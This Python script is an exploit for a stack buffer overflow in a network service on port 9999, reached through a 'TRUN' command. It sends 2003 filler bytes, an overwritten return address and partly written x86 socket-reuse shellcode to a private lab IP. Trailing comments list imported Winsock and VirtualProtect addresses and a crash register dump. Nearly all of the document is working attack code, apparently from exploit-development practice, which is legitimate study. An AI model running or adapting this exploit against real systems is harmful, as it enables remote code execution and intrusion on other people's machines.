#!/usr/bin/python
import socket
from struct import pack
from time import sleep

host = '172.16.192.168'
port = 9999
max_size = 5000

############### SOCKET CALL ###################################
exploit  = "\xCC"
exploit += "\x83\xEC\x7C" 			# SUB ESP,7C
exploit += "\xB2\x06"     			# MOV DL,6
exploit += "\x52"		  			# PUSH EDX
exploit += "\xB2\x01" 	  			# MOV DL,1
exploit += "\x52"		  			# PUSH EDX
exploit += "\x42"		  			# INC EDX
exploit += "\x52"		  			# PUSH EDX
exploit += "\xBB\x66\x7C\x25\x40" 	# MOV EBX,40257C66
exploit += "\xC1\xEB\x08"       	# SHR EBX,8
exploit += "\xFF\xD3"				# CALL EBX
#################################################################

############### BIND CALL ###################################












payload  = "A" * 2003
payload += pack("<L", 0x625011af)
payload += exploit
payload += "\xCC" * (max_size - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "[*] Sending payload of size: {0} chars...".format(len(payload))
s.send("TRUN /.:/" + payload + "\r\n")
s.close()


# 0040257C   $-FF25 FC614000  JMP DWORD PTR DS:[<&WS2_32.socket>]      ;  WS2_32.socket(2,1,6)
# 00402564   $-FF25 D8614000  JMP DWORD PTR DS:[<&WS2_32.bind>]        ;  WS2_32.bind
# 00402554   $-FF25 F0614000  JMP DWORD PTR DS:[<&WS2_32.listen>]      ;  WS2_32.listen
# 0040254C   $-FF25 D4614000  JMP DWORD PTR DS:[<&WS2_32.accept>]      ;  WS2_32.accept
# 0040252C   $-FF25 F4614000  JMP DWORD PTR DS:[<&WS2_32.recv>]        ;  WS2_32.recv

# 00402DC0   $-FF25 98614000  JMP DWORD PTR DS:[<&msvcrt.malloc>]      ;  msvcrt.malloc
# 00402E48   $-FF25 54614000  JMP DWORD PTR DS:[<&KERNEL32.VirtualProt>;  kernel32.VirtualProtect

# EAX 00B7F22C 
# ECX 003E6A6C
# EDX 00000000
# EBX 00000080
# ESP 00B7FA0C
# EBP 41414141
# ESI 0024A6F8
# EDI 0024DE38
# EIP 00B7FA0D




